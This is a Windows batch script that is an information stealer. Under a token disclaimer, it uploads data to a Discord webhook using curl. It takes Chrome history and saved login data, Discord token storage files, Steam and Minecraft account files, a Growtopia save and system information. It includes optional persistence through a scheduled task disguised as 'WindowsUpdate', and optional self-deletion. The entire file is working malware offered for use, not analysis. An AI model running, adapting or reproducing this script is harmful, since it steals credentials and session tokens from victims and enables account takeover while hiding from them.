@echo off
:: BY REMOVING THE (GOTO)s YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
goto remove_this_if_you_agree_to_follow_the_TOS

:: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
2>NUL set "webhook=https://discord.com/api/webhooks/"

:: GET IP ADDRESS
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

::GET TIME
for /f "tokens=1-4 delims=/:." %%a in ("2>NUL %TIME%") do (
    2>NUL set HH24=%%a
    2>NUL set MI=%%b
    2>NUL set SS=%%c
)

:: SEND FIRST REPORT MESSAGE WITH SOME INFO
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%

:: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipsysteminfocapture
2>NUL set tempsys=%appdata%\sysinfo.txt
2>NUL SystemInfo > %tempsys%
2>NUL curl --silent --output /dev/null -F systeminfo=@%tempsys% %webhook%
2>NUL del %tempsys%
:skipsysteminfocapture

:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipgrowtopia
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` - GROWTOPIA -```\"}"  %webhook%
2>NUL curl --silent --output /dev/null -F save.dat=@%localappdata%\Growtopia\save.dat %webhook%
:skipgrowtopia

:: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipchrome
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
2>NUL curl --silent --output /dev/null -F History=@%localappdata%\Google\Chrome"\User Data"\Default\History %webhook%
2>NUL curl --silent --output /dev/null -F Shortcuts=@%localappdata%\Google\Chrome"\User Data"\Default\Shortcuts %webhook%
2>NUL curl --silent --output /dev/null -F Bookmarks=@%localappdata%\Google\Chrome"\User Data"\Default\Bookmarks %webhook%
2>NUL curl --silent --output /dev/null -F Bookmarks=@%localappdata%\Google\Chrome"\User Data"\Default"\Login Data" %webhook%
:skipchrome

:: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipdiscord
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('dir /b %appdata%\discord"\Local Storage"\leveldb\') do (
	2>NUL echo %%f|find ".ldb"
	2>NUL if errorlevel 1 () else (2>NUL curl --silent --output /dev/null -F token.ldb=@%appdata%\discord"\Local Storage"\leveldb\%%f %webhook%)
)
:skipdiscord

:: STEAM - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipsteam
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
2>NUL curl --silent --output /dev/null -F steamusers=@C:"\Program Files (x86)"\Steam\config\loginusers.vdf %webhook%
2>NUL curl --silent --output /dev/null -F steamusers=@C:"\Program Files"\Steam\config\loginusers.vdf %webhook%
:skipsteam

:: MINECRAFT - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipminecraft
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
2>NUL curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_profiles.json %webhook%
2>NUL curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_accounts.json %webhook%
:skipminecraft

:: INFORMATION ABOUT THE PROCESS
:: -----------------------------
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- INFO -```\"}"  %webhook%

:: MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON
2>NUL set "when=WEEKLY"
2>NUL set "ScheduleName=WindowsUpdate"

:: DO NOT EDIT
2>NUL set "recurring=false"

:: RECURRING START OF THE BATCH FILE - REMOVE THE GOTO IF YOU WANT IT
goto skiprecurring
:: Copy batch file to a folder
2>NUL copy "%~f0" "%appdata%\Microsoft\Windows\%~nx0"
2>NUL SchTasks /Create /F /SC %when% /TN "%ScheduleName%" /TR "%appdata%\Microsoft\Windows\%~nx0"
2>NUL set "recurring=true, %when%"
:skiprecurring

:: SELF DELETE AFTER EXECUTION - REMOVE GOTO IF YOU WANT IT
goto skipselfdelete
2>NUL if not "%cd%"=="%appdata%\Microsoft\Windows" (
2>NUL call :deleteSelf&exit /b
:deleteSelf
2>NUL start /b "" cmd /c del "%~f0"&exit /b
)
:skipselfdelete

:: SEND STATUS MESSAGE
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Recurring (Tasked): %recurring%```\"}"  %webhook%
:: SEND REPORT ENDED MESSAGE
2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[End of report]```\"}"  %webhook%

:remove_this_if_you_agree_to_follow_the_TOS
exit
